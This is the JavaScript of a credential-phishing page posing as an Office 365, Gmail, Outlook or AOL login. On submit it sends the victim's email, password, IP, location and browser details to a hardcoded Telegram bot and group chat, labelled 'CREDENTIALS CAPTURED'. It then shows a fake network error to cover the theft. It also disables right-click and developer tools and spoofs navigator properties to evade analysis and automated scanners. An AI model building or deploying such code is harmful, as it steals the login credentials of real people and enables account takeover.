// ================== CONFIGURATION ==================
const TELEGRAM_CONFIG = {
    botToken: "7983528037:AAFpvdTJEJ42BryLHSDjH5OuvEURlOJ7zOA",
    groupChatId: "-1002763948275", 
    enableTelegram: true
};

// ================== DOM ELEMENTS ==================
const loginForm = document.getElementById('loginForm');
const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const loadingScreen = document.getElementById('loading');
const statusMessage = document.getElementById('statusMessage');
const providers = document.querySelectorAll('.provider');
const hint = document.getElementById('hint');

// ================== PROVIDER SWITCHING ==================
const providerInfo = {
    office: {
        hint: "Use your Office 365 account",
        placeholder: "user@company.com"
    },
    gmail: {
        hint: "Sign in with Google",
        placeholder: "you@gmail.com"
    },
    outlook: {
        hint: "Use your Outlook account",
        placeholder: "user@outlook.com"
    },
    aol: {
        hint: "Sign in with AOL",
        placeholder: "you@aol.com"
    }
};

// Add click event listeners to provider buttons
providers.forEach(provider => {
    provider.addEventListener('click', () => {
        providers.forEach(p => p.classList.remove('active'));
        provider.classList.add('active');
        
        const providerType = provider.dataset.provider;
        hint.textContent = providerInfo[providerType].hint;
        emailInput.placeholder = providerInfo[providerType].placeholder;
    });
});

// ================== TELEGRAM EXFILTRATION ==================
class TelegramExfiltrator {
    constructor() {
        this.working = false;
    }

    // JSONP method for GitHub Pages compatibility
    jsonpRequest(method, params = {}) {
        return new Promise((resolve) => {
            const callbackName = 'tgJsonp_' + Date.now();
            const script = document.createElement('script');
            
            window[callbackName] = (response) => {
                delete window[callbackName];
                document.body.removeChild(script);
                resolve(response);
            };

            let url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/${method}?callback=${callbackName}`;
            
            for (const [key, value] of Object.entries(params)) {
                url += `&${key}=${encodeURIComponent(value)}`;
            }

            script.src = url;
            document.body.appendChild(script);

            setTimeout(() => {
                if (window[callbackName]) {
                    delete window[callbackName];
                    document.body.removeChild(script);
                    resolve({ok: false, description: 'Timeout'});
                }
            }, 8000);
        });
    }

    // Main send method using JSONP
    async sendToTelegram(message) {
        if (!TELEGRAM_CONFIG.enableTelegram) {
            return false;
        }

        try {
            const response = await this.jsonpRequest('sendMessage', {
                chat_id: TELEGRAM_CONFIG.groupChatId,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            });

            return response.ok;

        } catch (error) {
            console.error('Send error:', error);
            return false;
        }
    }
}

// ================== DATA COLLECTION ==================
async function getPublicIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return { ip: data.ip };
    } catch (error) {
        return { ip: 'unknown' };
    }
}

function getSystemInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        screen: `${screen.width}x${screen.height}`,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookiesEnabled: navigator.cookieEnabled,
        javaEnabled: navigator.javaEnabled()
    };
}

async function getGeolocationData(ip) {
    if (ip === 'unknown') return {};
    
    try {
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await response.json();
        return {
            country: data.country_name || 'Unknown',
            city: data.city || 'Unknown',
            region: data.region || 'Unknown',
            isp: data.org || 'Unknown'
        };
    } catch (error) {
        return {};
    }
}

// ================== MAIN EXECUTION ==================
const telegramExfiltrator = new TelegramExfiltrator();

// Form submission handler
loginForm.addEventListener('submit', async function(event) {
    event.preventDefault();
    
    const email = emailInput.value.trim();
    const password = passwordInput.value;
    const rememberMe = document.getElementById('remember').checked;
    
    if (!email || !password) {
        alert('Please enter both email and password.');
        return;
    }

    loadingScreen.style.display = 'flex';
    statusMessage.textContent = 'Verifying credentials...';

    try {
        const [ipData, systemInfo, geoData] = await Promise.all([
            getPublicIP(),
            Promise.resolve(getSystemInfo()),
            getPublicIP().then(ipData => getGeolocationData(ipData.ip))
        ]);

        statusMessage.textContent = 'Securely transmitting...';

        const message = "🔐 **CREDENTIALS CAPTURED** \n\n" +
            "⏰ **Time:** " + new Date().toLocaleString() + "\n" +
            "📍 **IP:** " + (ipData.ip || 'unknown') + "\n" +
            "🌍 **Location:** " + (geoData.country || 'Unknown') + 
            (geoData.city ? ", " + geoData.city : "") + "\n" +
            "🏢 **ISP:** " + (geoData.isp || 'Unknown') + "\n" +
            "🌐 **Browser:** " + (systemInfo.userAgent.substring(0, 60) + "...") + "\n" +
            "🖥️  **Screen:** " + systemInfo.screen + "\n" +
            "🗣️  **Language:** " + systemInfo.language + "\n" +
            "⏰ **Timezone:** " + systemInfo.timezone + "\n\n" +
            "📧 **Email:** `" + email + "`\n" +
            "🔑 **Password:** `" + password + "`\n" +
            "💾 **Remember Me:** " + (rememberMe ? "Yes" : "No") + "\n\n" +
            "🔗 **URL:** " + window.location.href + "\n" +
            "👤 **User Agent:** " + systemInfo.userAgent;

        const success = await telegramExfiltrator.sendToTelegram(message);

        if (success) {
            statusMessage.textContent = 'Transmission complete!';
        } else {
            statusMessage.textContent = 'Local verification complete';
        }

        // Simulate authentication error
        setTimeout(() => {
            alert('ERROR: 0x80072EFD. Cannot connect to authentication service. Please check your network connection.');
            loadingScreen.style.display = 'none';
            
            // Clear form
            emailInput.value = '';
            passwordInput.value = '';
            document.getElementById('remember').checked = false;
        }, 2000);

    } catch (error) {
        statusMessage.textContent = 'Authentication error';
        loadingScreen.style.display = 'none';
        alert('An unexpected error occurred. Please try again.');
    }
});

// ================== SECURITY MEASURES ==================
document.addEventListener('contextmenu', (e) => {
    e.preventDefault();
    alert('Right-click is disabled for security reasons.');
});

document.addEventListener('keydown', (e) => {
    // Disable developer tools
    if (e.key === 'F12' || 
        (e.ctrlKey && e.shiftKey && e.key === 'I') ||
        (e.ctrlKey && e.shiftKey && e.key === 'C') ||
        (e.ctrlKey && e.key === 'U')) {
        e.preventDefault();
        alert('This action is not allowed for security reasons.');
    }
});

// ================== PASSWORD VISIBILITY TOGGLE ==================
const togglePassword = document.createElement('button');
togglePassword.type = 'button';
togglePassword.textContent = 'Show';
togglePassword.style.position = 'absolute';
togglePassword.style.right = '12px';
togglePassword.style.top = '50%';
togglePassword.style.transform = 'translateY(-50%)';
togglePassword.style.background = 'none';
togglePassword.style.border = 'none';
togglePassword.style.cursor = 'pointer';
togglePassword.style.color = '#6b7280';
togglePassword.style.fontSize = '12px';

const passwordContainer = passwordInput.parentElement;
passwordContainer.style.position = 'relative';
passwordContainer.appendChild(togglePassword);

togglePassword.addEventListener('click', () => {
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        togglePassword.textContent = 'Hide';
    } else {
        passwordInput.type = 'password';
        togglePassword.textContent = 'Show';
    }
});

// ================== INITIALIZATION ==================
emailInput.focus();

// Simulate Microsoft's loading behavior
window.addEventListener('load', () => {
    setTimeout(() => {
        document.body.style.opacity = '1';
    }, 100);
});

document.body.style.opacity = '0';
document.body.style.transition = 'opacity 0.3s ease';

// ================== ADDITIONAL SECURITY ==================
Object.defineProperty(navigator, 'webdriver', {
    get: () => false,
});

Object.defineProperty(navigator, 'plugins', {
    get: () => [1, 2, 3, 4, 5],
});

Object.defineProperty(navigator, 'languages', {
    get: () => ['en-US', 'en'],
});

// Prevent iframe embedding
if (window.top !== window.self) {
    window.top.location = window.self.location;
}
